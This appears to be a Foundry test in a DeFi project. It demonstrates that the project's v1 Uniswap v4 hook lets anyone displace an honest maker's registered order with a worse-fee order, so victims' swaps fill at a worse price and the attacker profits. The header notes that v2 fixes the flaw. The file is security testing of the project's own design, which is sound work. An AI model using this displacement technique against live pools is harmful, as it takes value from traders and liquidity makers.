// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ISwapVM} from "@1inch/swap-vm/src/interfaces/ISwapVM.sol";
import {PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";

import {ConfluenceBase} from "../../base/ConfluenceBase.t.sol";

/// @notice V2-10 scenario 6 on v1: the attack SUCCEEDS. v1's hook holds ONE active order per pool and
///         `registerOrder` replaces it (D-18): anyone may register their own order over Priya's, at no cost but gas.
///         The attacker ships a within-band but worse curve (1.00% fee against Priya's 0.30%) and registers it; the
///         victim's hinted swap then fills the attacker's curve, the victim gets less than from Priya's order, and the
///         attacker, as the maker, earns the difference. Priya's order stays shipped but is no longer reachable until she
///         registers again (and the attacker can displace her again). The v2 counterpart is `A06Registry` (a
///         slot per maker, no displacement; depth is real depth).
contract A06V1DisplacementTest is ConfluenceBase {
    using PoolIdLibrary for PoolKey;

    uint32 internal constant FEE_1_00_PCT = 10_000_000;

    function _value(address who) internal view returns (int256) {
        return int256(IERC20(USDC).balanceOf(who)) + int256(mumb.balanceOf(who) / 1e12);
    }

    function _victimGets(uint256 fillUsdc) internal returns (uint256 got) {
        uint256 before = mumb.balanceOf(trader);
        _swap(key, trader, usdcForMumb(), -int256(fillUsdc), _hint(fillUsdc));
        got = mumb.balanceOf(trader) - before;
    }

    function test_V210_v1DisplacementPaysTheAttackerAtTheVictimsExpense() public {
        uint256 fill = 1_000e6;
        deal(USDC, trader, 100_000e6);
        uint256 s = vm.snapshotState();
        uint256 withPriya = _victimGets(fill);
        require(vm.revertToStateAndDelete(s), "revert failed");

        // The attacker ships a worse curve and registers it over Priya's.
        address attacker = makeAddr("displacer");
        vm.prank(deployer);
        mumb.mint(attacker, SHIPPED_MUMB);
        deal(USDC, attacker, SHIPPED_USDC);
        vm.startPrank(attacker);
        mumb.approve(AQUA, type(uint256).max);
        IERC20(USDC).approve(AQUA, type(uint256).max);
        vm.stopPrank();
        bytes memory args = band.build(manager, key, BAND_BPS);
        ISwapVM.Order memory worse = _buildOrder(attacker, _buildBandProgram(FEE_1_00_PCT, address(band), args));
        address[] memory tokens = new address[](2);
        tokens[0] = address(mumb);
        tokens[1] = USDC;
        uint256[] memory amounts = new uint256[](2);
        (amounts[0], amounts[1]) = (SHIPPED_MUMB, SHIPPED_USDC);
        vm.prank(attacker);
        aqua.ship(ROUTER, abi.encode(worse), tokens, amounts);
        int256 a0 = _value(attacker);
        int256 p0 = _value(priya);
        vm.prank(attacker);
        hook.registerOrder(key, worse); // displaces Priya: no stake, no check of the previous maker

        uint256 withAttacker = _victimGets(fill);
        int256 attackerPnl = _value(attacker) - a0;
        emit log_named_uint("victim MUMB with Priya's order", withPriya);
        emit log_named_uint("victim MUMB with the displacer's order", withAttacker);
        emit log_named_int("v1 displacer PnL as the maker (raw USDC, MUMB at 1 USDC)", attackerPnl);
        assertEq(hook.orderOf(key.toId()).maker, attacker, "the displacer holds the pool's only slot");
        assertLt(withAttacker, withPriya, "the victim got less than Priya's order would have given");
        assertGt(attackerPnl, 0, "v1: displacement pays the attacker");
        assertEq(_value(priya), p0, "Priya's wallet did not move: she simply lost the slot");
        _assertHookHoldsNothing();
    }
}
